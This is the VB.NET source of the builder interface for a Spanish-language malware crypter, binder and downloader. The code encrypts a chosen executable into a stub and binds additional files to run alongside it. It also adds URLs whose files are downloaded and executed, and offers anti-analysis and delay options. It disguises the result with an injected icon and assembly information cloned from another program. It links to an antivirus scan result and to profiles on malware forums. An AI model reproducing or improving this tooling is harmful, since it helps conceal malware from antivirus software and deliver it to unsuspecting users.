Imports System.Threading
Imports System.IO
Imports System.Reflection
Imports System.Text

Public Class GUI

    Private Sub GUI_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.comboDrop_Binder.SelectedIndex = 0
        Me.comboDrop_Downloader.SelectedIndex = 0
    End Sub

    Private Sub btnSeleccionar_Crypter_Click(sender As Object, e As EventArgs) Handles btnSeleccionar_Crypter.Click
        With dialogCrypter
            .Title = "Abrir archivo..."
            .Filter = "Ejecutables (*.exe)|*.exe"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                txtArchivo_Crypter.Text = .FileName
            Else
                txtArchivo_Crypter.Text = ""
            End If
        End With
    End Sub

    Private Sub btnAgregar_Binder_Click(sender As Object, e As EventArgs) Handles btnAgregar_Binder.Click
        With dialogBinder
            .Title = "Abrir archivo..."
            .Filter = "Todos (*.*)|*.*"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then lstArchivos_Binder.Items.Add(.FileName).SubItems.Add(True)
        End With
    End Sub

    Private Sub lstArchivos_Binder_Click(sender As Object, e As EventArgs) Handles lstArchivos_Binder.SelectedIndexChanged
        If lstArchivos_Binder.SelectedItems.Count > 0 Then
            chkEjecutar_Binder.Visible = True
            Dim itemActual As ListViewItem = lstArchivos_Binder.FocusedItem
            Dim bEjecutar As Boolean = CBool(itemActual.SubItems.Item(1).Text)
            chkEjecutar_Binder.Checked = bEjecutar
        Else
            chkEjecutar_Binder.Visible = False
        End If
    End Sub

    Private Sub chkEjecutar_Binder_CheckedChanged(sender As Object) Handles chkEjecutar_Binder.CheckedChanged
        If lstArchivos_Binder.SelectedItems.Count > 0 Then
            Dim itemActual As ListViewItem = lstArchivos_Binder.FocusedItem
            itemActual.SubItems.Item(1).Text = chkEjecutar_Binder.Checked
        End If
    End Sub

    Private Sub btnQuitar_Binder_Click(sender As Object, e As EventArgs) Handles btnQuitar_Binder.Click
        If lstArchivos_Binder.SelectedItems.Count > 0 Then
            Dim itemActual As ListViewItem = lstArchivos_Binder.FocusedItem
            lstArchivos_Binder.Items.Remove(itemActual)
        End If
    End Sub

    Private Sub btnAgregar_Downloader_Click(sender As Object, e As EventArgs) Handles btnAgregar_Downloader.Click
        Dim URL As String = InputBox("Introduzca la URL completa" & vbNewLine & "Ej: http://servidor.com/archivo.ext", "Introduzca la URL")
        If String.IsNullOrEmpty(URL) Then Exit Sub
        Dim sExt As String = ExtStr(URL, 2, "/")
        If sExt = "." & ExtStr(URL, 3, "/") Then
            sExt = InputBox("Parece que la URL que ingresó no contiene la extensión del archivo a descargar." & vbNewLine & "Introduzca la extensión del archivo (incluyendo el punto (.))" & vbNewLine & "Ej: .ext", "Introduzca la extensión")
            If Not sExt.StartsWith(".") Then
                sExt = "." & sExt
            End If
        End If
        With lstArchivos_Downloader.Items.Add(URL)
            .SubItems.Add(sExt)
            .SubItems.Add(True)
        End With
    End Sub

    Private Sub btnQuitar_Downloader_Click(sender As Object, e As EventArgs) Handles btnQuitar_Downloader.Click
        If lstArchivos_Downloader.SelectedItems.Count > 0 Then
            Dim itemActual As ListViewItem = lstArchivos_Downloader.FocusedItem
            lstArchivos_Downloader.Items.Remove(itemActual)
        End If
    End Sub

    Private Sub chkEjecutar_Downloader_CheckedChanged(sender As Object) Handles chkEjecutar_Downloader.CheckedChanged
        If lstArchivos_Downloader.SelectedItems.Count > 0 Then
            Dim itemActual As ListViewItem = lstArchivos_Downloader.FocusedItem
            itemActual.SubItems.Item(2).Text = chkEjecutar_Downloader.Checked
        End If
    End Sub

    Private Sub lstArchivos_Downloader_Click(sender As Object, e As EventArgs) Handles lstArchivos_Downloader.SelectedIndexChanged
        If lstArchivos_Downloader.SelectedItems.Count > 0 Then
            chkEjecutar_Downloader.Visible = True
            Dim itemActual As ListViewItem = lstArchivos_Downloader.FocusedItem
            Dim bEjecutar As Boolean = CBool(itemActual.SubItems.Item(2).Text)
            chkEjecutar_Downloader.Checked = bEjecutar
        Else
            chkEjecutar_Downloader.Visible = False
        End If
    End Sub

    Private Sub btnGenerar_Crypter_Click(sender As Object, e As EventArgs) Handles btnGenerar_Crypter.Click
        For i = 1 To 6
            txtClave_Crypter.Text = getKey(50)
            Thread.Sleep(50)
            Application.DoEvents()
        Next i
    End Sub

    Private Sub chkRetraso_CheckedChanged(sender As Object) Handles chkRetraso.CheckedChanged
        If chkRetraso.Checked Then
            updwnRetraso.Enabled = True
        Else
            updwnRetraso.Enabled = False
            updwnRetraso.Value = 0
        End If
    End Sub

    Private Sub chkIcono_CheckedChanged(sender As Object) Handles chkIcono.CheckedChanged
        txtIcono.Text = ""
        If chkIcono.Checked Then
            btnIcono.Enabled = True
        Else
            btnIcono.Enabled = False
        End If
    End Sub

    Private Sub chkAssembly_CheckedChanged(sender As Object) Handles chkAssembly.CheckedChanged
        txtAssembly.Text = ""
        If chkAssembly.Checked Then
            btnAssembly.Enabled = True
        Else
            btnAssembly.Enabled = False
        End If
    End Sub

    Private Sub btnIcono_Click(sender As Object, e As EventArgs) Handles btnIcono.Click
        With dialogIcono
            .Title = "Seleccionar icono..."
            .Filter = "Iconos (*.ico)|*.ico"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                txtIcono.Text = .FileName
            Else
                txtIcono.Text = ""
            End If
        End With
    End Sub

    Private Sub btnAssembly_Click(sender As Object, e As EventArgs) Handles btnAssembly.Click
        With dialogAssembly
            .Title = "Seleccionar ejecutable..."
            .Filter = "Ejecutables (*.exe)|*.exe|Librerias (*.dll)|*.dll"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                txtAssembly.Text = .FileName
            Else
                txtAssembly.Text = ""
            End If
        End With
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("http://foro.udtools.net/member.php?7932-chequinho")
        Process.Start("http://level-23.cc/forum/member.php?4392-chequinho")
        Process.Start("http://www.indetectables.net/memberlist.php?mode=viewprofile&u=67773")
    End Sub

    Private Sub lblScan_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles lblScan.LinkClicked
        Process.Start("http://scan.majyx.net/result.php?sid=54465")
    End Sub

    Private Sub btnCrear_Click(sender As Object, e As EventArgs) Handles btnCrear.Click
        Try
            Dim delimitador_master As String = "#._.#"
            Dim delimitador_crypter As String = "#.__.#"
            Dim delimitador_binder As String = "#.___.#"
            Dim delimitador_files_binder = "#.///.#"
            Dim delimitador_files_ejec_binder As String = ".!!!."
            Dim delimitador_files_ejec_downloader As String = ".||||."
            Dim delimitador_downloader As String = "#.____.#"
            Dim delimitador_files_downloader As String = "#.////.#"
            Dim stubPath As String = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) & "\stub.dll"
            Dim stubBackupPath As String = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) & "\stub.original"
            Dim filePath As String = txtArchivo_Crypter.Text
            Dim iconPath As String = txtIcono.Text
            Dim assemblyPath As String = txtAssembly.Text
            Dim filesBinder As String = ""
            Dim filesDownloader As String = ""
            Dim stubData As String = ""
            Dim nuclearData As String = ""
            Dim encryptedData As String = ""
            Dim fileData As String = ""
            Dim crypterData As String = ""
            Dim binderData As String = ""
            Dim downloaderData As String = ""
            Dim sKey As String = txtClave_Crypter.Text

            progressCrear.Value = 10

            If Not My.Computer.FileSystem.FileExists(stubPath) Then
                MsgBox("Parece que el archivo 'stub.dll' no está aquí...", vbCritical, "Error de Archivo")
                progressCrear.Value = 0
                Exit Sub
            End If
            If filePath = vbNullString Then
                MsgBox("No ha seleccionado archivo a cifrar", vbCritical, "Error de Archivo")
                progressCrear.Value = 0
                Exit Sub
            End If

            If chkIcono.Checked Then
                If iconPath = vbNullString Then
                    MsgBox("No ha seleccionado icono...", vbCritical, "Error de Archivo")
                    progressCrear.Value = 0
                    Exit Sub
                Else
                    If Not My.Computer.FileSystem.FileExists(stubBackupPath) Then My.Computer.FileSystem.CopyFile(stubPath, stubBackupPath)
                    IconChanger.InjectIcon(stubPath, iconPath)
                End If
            End If
            If chkAssembly.Checked Then
                If assemblyPath = vbNullString Then
                    MsgBox("No ha seleccionado ejecutable del cual clonar información de ensamblado...", vbCritical, "Error de Archivo")
                    progressCrear.Value = 0
                    Exit Sub
                Else
                    If Not My.Computer.FileSystem.FileExists(stubBackupPath) Then My.Computer.FileSystem.CopyFile(stubPath, stubBackupPath)
                    cloneInfo(assemblyPath, stubPath)
                End If
            End If

            progressCrear.Value = 20

            fileData = ReadFile(filePath)

            crypterData = fileData & delimitador_crypter & chkAntis.Checked & delimitador_crypter & updwnRetraso.Value & delimitador_crypter

            progressCrear.Value = 30

            If lstArchivos_Binder.Items.Count > 0 Then
                For i = 0 To (lstArchivos_Binder.Items.Count - 1)
                    Dim currentBinderItem As ListViewItem = lstArchivos_Binder.Items.Item(i)
                    Dim currentBinderFilePath As String = currentBinderItem.Text
                    Dim currentBinderFileData As String = ReadFile(currentBinderFilePath)
                    Dim currentBinderExt As String = ExtStr(currentBinderFilePath, 2)
                    Dim currentBinderExec As Boolean = CBool(currentBinderItem.SubItems(1).Text)
                    Dim currentBinderData As String = currentBinderFileData & delimitador_files_ejec_binder & currentBinderExt & delimitador_files_ejec_binder & currentBinderExec
                    filesBinder &= currentBinderData & delimitador_files_binder
                Next
                binderData = filesBinder & delimitador_binder & comboDrop_Binder.Text & delimitador_binder
            Else
                binderData = "NO_DATA"
            End If

            progressCrear.Value = 40

            If lstArchivos_Downloader.Items.Count > 0 Then
                For i = 0 To (lstArchivos_Downloader.Items.Count - 1)
                    Dim currentDownloaderItem As ListViewItem = lstArchivos_Downloader.Items.Item(i)
                    Dim currentDownloaderURL As String = currentDownloaderItem.Text
                    Dim currentDownloaderExt As String = currentDownloaderItem.SubItems(1).Text
                    Dim currentDownloaderExec As Boolean = CBool(currentDownloaderItem.SubItems(2).Text)
                    Dim currentDownloaderData As String = currentDownloaderURL & delimitador_files_ejec_downloader & currentDownloaderExt & delimitador_files_ejec_downloader & currentDownloaderExec
                    filesDownloader &= currentDownloaderData & delimitador_files_downloader
                Next
                downloaderData = filesDownloader & delimitador_downloader & comboDrop_Downloader.Text & delimitador_downloader
            Else
                downloaderData = "NO_DATA"
            End If

            progressCrear.Value = 50

            stubData = ReadFile(stubPath)

            nuclearData = crypterData & delimitador_master & binderData & delimitador_master & downloaderData & delimitador_master

            progressCrear.Value = 60

            If rbtnUnknown_Crypter.Checked Then
                encryptedData = stubData & delimitador_master & Unknown(nuclearData, sKey) & delimitador_master & sKey & delimitador_master & "1" & delimitador_master
            ElseIf rbtnStairs_Crypter.Checked Then
                encryptedData = stubData & delimitador_master & Stairs(nuclearData, sKey) & delimitador_master & sKey & delimitador_master & "2" & delimitador_master
            End If

            progressCrear.Value = 70

            With dialogCrear
                .FileName = ExtStr(filePath, 1) & ".enc"
                .Title = "Guardar ejecutable cifrado..."
                .Filter = "Ejecutables (*.exe)|*.exe"
                .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                If .ShowDialog = Windows.Forms.DialogResult.OK Then
                    WriteFile(.FileName, encryptedData)
                    progressCrear.Value = 80
                    progressCrear.Value = 90
                    If My.Computer.FileSystem.FileExists(stubBackupPath) Then
                        My.Computer.FileSystem.DeleteFile(stubPath)
                        My.Computer.FileSystem.RenameFile(stubBackupPath, ExtStr(stubPath, 3))
                    End If
                    progressCrear.Value = 100
                    MsgBox("¡Ejecutable cifrado correctamente!", MsgBoxStyle.Information + MsgBoxStyle.OkOnly, "Correcto")
                End If
                progressCrear.Value = 0
            End With
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, "Error en tiempo de ejecución")
            progressCrear.Value = 0
        End Try
    End Sub
End Class
